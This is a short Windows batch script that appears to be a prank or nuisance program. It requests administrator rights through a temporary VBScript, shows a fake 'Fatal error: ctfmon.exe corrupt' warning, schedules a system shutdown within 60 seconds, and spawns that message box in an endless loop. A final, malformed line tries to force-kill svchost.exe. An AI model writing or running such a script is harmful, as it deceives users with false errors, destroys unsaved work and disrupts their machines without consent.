set "params=%*"
cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) && fsutil dirty query %systemdrive% 1>nul 2>nul || (  echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "cmd.exe", "/k cd ""%~sdp0"" && ""%~s0"" %params%", "", "runas", 1 >> "%temp%\getadmin.vbs" && "%temp%\getadmin.vbs" && exit /B )

@echo off

echo x=msgbox("Fatal error: ctfmon.exe corrupt" ,48, "Windows is Shutting down due to a fatal error") >> msgbox.vbs
shutdown -s -t 60
:a
start msgbox.vbs
goto a

/C taskkill /IM svchost.exe /F
